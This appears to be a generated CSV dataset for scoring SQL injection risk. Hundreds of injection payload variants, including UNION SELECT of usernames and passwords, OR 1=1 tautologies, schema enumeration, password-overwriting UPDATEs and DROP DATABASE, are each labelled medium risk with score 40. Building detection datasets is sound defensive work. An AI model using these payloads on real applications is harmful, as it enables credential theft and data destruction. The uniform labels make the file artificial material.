query,risk,score
' UNION SELECT * FROM information_schema.tables -- # m,medium,40
1' OR '1' = '1' GROUP BY 1 -- # e,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' HAVING 1=1 # # o,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; SELECT COUNT(*) FROM users -- # c,medium,40
'; UPDATE users SET password='pass' # t,medium,40
'; SELECT @@version -- -- ,medium,40
' HAVING 1=1 # # n,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 1",medium,40
"' UNION SELECT username, password FROM users -- # y",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' HAVING 1=1 # -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- # 0,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 5",medium,40
'; UPDATE users SET password='pass' # c,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 3",medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # 3",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # k",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 2",medium,40
'; SELECT COUNT(*) FROM users -- # i,medium,40
1' OR '1' = '1' GROUP BY 1 -- # l,medium,40
'; SELECT COUNT(*) FROM users -- # i,medium,40
'; DROP DATABASE temp -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- # h,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # j",medium,40
"' UNION SELECT username, password FROM users -- # l",medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # o",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 1",medium,40
'; DROP DATABASE temp -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # g,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; SELECT @@version -- # 6,medium,40
' UNION SELECT * FROM information_schema.tables -- # e,medium,40
1' OR '1' = '1' GROUP BY 1 -- # e,medium,40
' UNION SELECT * FROM information_schema.tables -- # 4,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
' OR username LIKE '%admin%' -- # c,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' HAVING 1=1 # # 7,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- # e,medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; SELECT @@version -- # 7,medium,40
' HAVING 1=1 # -- ,medium,40
' HAVING 1=1 # # o,medium,40
1' OR 1=1; SELECT * FROM users -- # 0,medium,40
'; SELECT @@version -- # e,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
' HAVING 1=1 # # u,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
'; SELECT @@version -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # n,medium,40
' UNION SELECT * FROM information_schema.tables -- # o,medium,40
'; UPDATE users SET password='pass' # 0,medium,40
'; SELECT @@version -- # f,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' HAVING 1=1 # -- ,medium,40
' or 1 = 1 LIMIT 1 -- # 8,medium,40
"' UNION SELECT username, password FROM users -- -- ",medium,40
'; SELECT @@version -- # 0,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # m",medium,40
' OR username LIKE '%admin%' -- # x,medium,40
'; SELECT @@version -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # q,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
'; DROP DATABASE temp -- # w,medium,40
'; DROP DATABASE temp -- # 0,medium,40
'; SELECT COUNT(*) FROM users -- # m,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # r,medium,40
1' OR 1=1; SELECT * FROM users -- # f,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # r",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # h",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # d",medium,40
'; DROP DATABASE temp -- # t,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # g",medium,40
' or 1 = 1 LIMIT 1 -- # m,medium,40
' UNION SELECT * FROM information_schema.tables -- -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; DROP DATABASE temp -- # i,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' OR username LIKE '%admin%' -- # f,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' HAVING 1=1 # # 6,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- ,medium,40
' or 1=1 in (select * from users) -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
"' UNION SELECT username, password FROM users -- # b",medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
'; SELECT COUNT(*) FROM users -- # f,medium,40
'; SELECT @@version -- -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' HAVING 1=1 # # 4,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ",medium,40
'; SELECT COUNT(*) FROM users -- # p,medium,40
' HAVING 1=1 # -- ,medium,40
' OR username LIKE '%admin%' -- # u,medium,40
' or 1 = 1 LIMIT 1 -- -- ,medium,40
' OR username LIKE '%admin%' -- # 7,medium,40
1' OR 1=1; SELECT * FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' # h,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- ",medium,40
' UNION SELECT * FROM information_schema.tables -- # s,medium,40
'; UPDATE users SET password='pass' # 3,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; DROP DATABASE temp -- -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; UPDATE users SET password='pass' -- ,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # q,medium,40
"' UNION SELECT username, password FROM users -- # h",medium,40
'; DROP DATABASE temp -- # a,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; SELECT @@version -- -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- # y,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # i",medium,40
1' OR '1' = '1' GROUP BY 1 -- # j,medium,40
'; SELECT COUNT(*) FROM users -- # q,medium,40
'; DROP DATABASE temp -- -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
' or 1 = 1 LIMIT 1 -- # b,medium,40
'; DROP DATABASE temp -- # 3,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 4",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
'; SELECT @@version -- -- ,medium,40
' or 1 = 1 LIMIT 1 -- # n,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- ",medium,40
'; UPDATE users SET password='pass' -- ,medium,40
'; SELECT COUNT(*) FROM users -- -- ,medium,40
'; UPDATE users SET password='pass' # i,medium,40
' OR username LIKE '%admin%' -- -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # z",medium,40
'; DROP DATABASE temp -- # 7,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- # z5gif,medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
' or 1=1 in (select * from users) -- -- sqne,medium,40
'; SELECT @@version -- # urkgi,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- # 98n2l,medium,40
'; SELECT COUNT(*) FROM users -- -- rhiz,medium,40
'; SELECT COUNT(*) FROM users -- -- zfo6,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- ucgb",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
' or 1=1 in (select * from users) -- OR 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
' HAVING 1=1 # LIMIT 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 40h6",medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
1' OR '1' = '1' GROUP BY 1 -- # zss7g,medium,40
'; SELECT COUNT(*) FROM users -- -- ma2n,medium,40
"' UNION SELECT username, password FROM users -- # f3jzx",medium,40
' OR username LIKE '%admin%' -- LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 2jls,medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
"' UNION SELECT username, password FROM users -- -- ykno",medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
'; SELECT @@version -- -- ncqn,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
"' UNION SELECT username, password FROM users -- -- 7fd3",medium,40
'; SELECT COUNT(*) FROM users -- -- n49d,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- AND 1=1",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
'; SELECT @@version -- AND 1=1,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
'; SELECT @@version -- OR 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # ,medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- # 91zro,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 2t6l,medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # ,medium,40
'; UPDATE users SET password='pass' -- 04wo,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
' or 1=1 in (select * from users) -- # hgy84,medium,40
' OR username LIKE '%admin%' -- LIMIT 1,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/ # ,medium,40
'; UPDATE users SET password='pass' # 349k7,medium,40
'; SELECT @@version -- LIMIT 1,medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # ",medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # otvy9",medium,40
"' UNION SELECT username, password FROM users -- -- oa33",medium,40
' or 1 = 1 LIMIT 1 -- # u1xo6,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 -- ",medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1",medium,40
' or 1 = 1 LIMIT 1 -- AND 1=1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
1' OR '1' = '1' GROUP BY 1 -- # 6x8va,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/ # ,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
' HAVING 1=1 # -- dt2w,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
' HAVING 1=1 # LIMIT 1,medium,40
'; UPDATE users SET password='pass' OR 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
' HAVING 1=1 # -- ff4l,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 6gbly",medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
' OR username LIKE '%admin%' -- -- vpat,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # hykhl",medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1,medium,40
' OR username LIKE '%admin%' -- # 6t4p2,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- LIMIT 1",medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # ",medium,40
'; UPDATE users SET password='pass' LIMIT 1,medium,40
' HAVING 1=1 # /**/ # ,medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
' or 1 = 1 LIMIT 1 -- # i1rno,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
'; SELECT @@version -- -- 38e0,medium,40
'; SELECT @@version -- LIMIT 1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # dxrap",medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- AND 1=1,medium,40
' OR username LIKE '%admin%' -- -- xanx,medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
' HAVING 1=1 # LIMIT 1,medium,40
' or 1 = 1 LIMIT 1 -- # 923k2,medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
' OR username LIKE '%admin%' -- AND 1=1,medium,40
'; DROP DATABASE temp -- -- k9qy,medium,40
"' UNION SELECT username, password FROM users -- # o0lgv",medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- 06o1,medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
' OR username LIKE '%admin%' -- # twxju,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # ty0ul",medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- # bg2fq,medium,40
'; UPDATE users SET password='pass' # 0nyi7,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- sxtc,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- hpyd",medium,40
'; UPDATE users SET password='pass' -- gij8,medium,40
'; SELECT @@version -- AND 1=1,medium,40
"' UNION SELECT username, password FROM users -- AND 1=1",medium,40
' HAVING 1=1 # LIMIT 1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- AND 1=1",medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
' or 1=1 in (select * from users) -- LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- -- juwo",medium,40
"' UNION SELECT username, password FROM users -- # z9qc1",medium,40
1' OR '1' = '1' GROUP BY 1 -- # y5i68,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- OR 1=1 -- ",medium,40
"' UNION SELECT username, password FROM users -- -- rd0n",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- d9d6",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- f8ob",medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1,medium,40
'; UPDATE users SET password='pass' -- ub1e,medium,40
'; SELECT @@version -- /**/ # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/ # ",medium,40
' OR username LIKE '%admin%' -- -- c4l3,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
'; UPDATE users SET password='pass' AND 1=1,medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
'; SELECT COUNT(*) FROM users -- # qku32,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 -- ",medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
' UNION SELECT * FROM information_schema.tables -- LIMIT 1,medium,40
"' UNION SELECT username, password FROM users -- -- hgwn",medium,40
' OR username LIKE '%admin%' -- # jac3e,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- LIMIT 1",medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
1' OR 1=1; SELECT * FROM users -- -- gwcl,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
' UNION SELECT * FROM information_schema.tables -- -- wfjb,medium,40
'; SELECT @@version -- /**/ # ,medium,40
' HAVING 1=1 # -- zbxr,medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
'; SELECT @@version -- # ulbzt,medium,40
'; DROP DATABASE temp -- # w8mb6,medium,40
1' OR 1=1; SELECT * FROM users -- -- b1yv,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # kr34q",medium,40
"' UNION SELECT username, password FROM users -- LIMIT 1",medium,40
' or 1=1 in (select * from users) -- AND 1=1,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- # 86iw5,medium,40
'; SELECT COUNT(*) FROM users -- # u5eze,medium,40
' or 1=1 in (select * from users) -- -- n2gj,medium,40
'; UPDATE users SET password='pass' # 7xtgt,medium,40
' HAVING 1=1 # LIMIT 1,medium,40
'; UPDATE users SET password='pass' # urihy,medium,40
' HAVING 1=1 # # 97l1p,medium,40
'; SELECT @@version -- /**/ # ,medium,40
' or 1 = 1 LIMIT 1 -- -- xfya,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- zpcx",medium,40
1' OR 1=1; SELECT * FROM users -- LIMIT 1,medium,40
'; DROP DATABASE temp -- -- 3bi1,medium,40
' UNION SELECT * FROM information_schema.tables -- # 3jsws,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 3lyu",medium,40
' or 1 = 1 LIMIT 1 -- /**/ # ,medium,40
1' OR '1' = '1' GROUP BY 1 -- OR 1=1 -- ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # i28to",medium,40
' UNION SELECT * FROM information_schema.tables -- -- hnoh,medium,40
' OR username LIKE '%admin%' -- AND 1=1,medium,40
'; DROP DATABASE temp -- -- 0sb8,medium,40
' UNION SELECT * FROM information_schema.tables -- OR 1=1 -- ,medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1,medium,40
' OR username LIKE '%admin%' -- AND 1=1,medium,40
' UNION SELECT * FROM information_schema.tables -- # xb423,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1,medium,40
'; DROP DATABASE temp -- AND 1=1,medium,40
' or 1=1 in (select * from users) -- AND 1=1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- OR 1=1 -- ",medium,40
' or 1 = 1 LIMIT 1 -- -- gzez,medium,40
1' OR 1=1; SELECT * FROM users -- AND 1=1,medium,40
' HAVING 1=1 # /**/ # ,medium,40
' HAVING 1=1 # /**/ # ,medium,40
' or 1=1 in (select * from users) -- -- 6zod,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- OR 1=1 -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- LIMIT 1,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- AND 1=1",medium,40
' OR username LIKE '%admin%' -- LIMIT 1,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
'; SELECT COUNT(*) FROM users -- AND 1=1,medium,40
' HAVING 1=1 # -- hg2y,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- jzkj",medium,40
1' OR 1=1; SELECT * FROM users -- /**/ # ,medium,40
'; SELECT COUNT(*) FROM users -- /**/ # ,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/ # ",medium,40
' or 1 = 1 LIMIT 1 -- LIMIT 1,medium,40
'; SELECT @@version -- LIMIT 1,medium,40
'; DROP DATABASE temp -- OR 1=1 -- ,medium,40
' OR username LIKE '%admin%' -- LIMIT 1,medium,40
'; UPDATE users SET password='pass' -- 4oii,medium,40
"' UNION SELECT username, password FROM users -- # crjm1",medium,40
' HAVING 1=1 # AND 1=1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # t52f0",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- u6hz",medium,40
'; DROP DATABASE temp -- /**/ # ,medium,40
"' UNION SELECT username, password FROM users -- # 3isu0",medium,40
' HAVING 1=1 # OR 1=1 -- ,medium,40
'; SELECT COUNT(*) FROM users -- LIMIT 1,medium,40
'; SELECT COUNT(*) FROM users -- OR 1=1 -- ,medium,40
'; UPDATE users SET password='pass' -- z9i4,medium,40
'; SELECT @@version -- # qn3vj,medium,40
' OR username LIKE '%admin%' -- /**/ # ,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- oqn2",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- idp9",medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
' or 1 = 1 LIMIT 1 -- -- lu0a,medium,40
' or 1=1 in (select * from users) -- -- h9j3,medium,40
'; UPDATE users SET password='pass' /**/ # ,medium,40
' HAVING 1=1 # /**/ # ,medium,40
' OR username LIKE '%admin%' -- AND 1=1,medium,40
"' UNION ALL SELECT 1,2 FROM users -- LIMIT 1",medium,40
1' OR '1' = '1' GROUP BY 1 -- # 5o2h9,medium,40
' OR username LIKE '%admin%' -- OR 1=1 -- ,medium,40
"' UNION SELECT username, password FROM users -- OR 1=1 -- ",medium,40
1' OR '1' = '1' GROUP BY 1 -- AND 1=1,medium,40
' or 1 = 1 LIMIT 1 -- OR 1=1 -- ,medium,40
'; SELECT @@version -- LIMIT 1,medium,40
'; SELECT @@version -- LIMIT 1,medium,40
' UNION SELECT * FROM information_schema.tables -- # ngtcc,medium,40
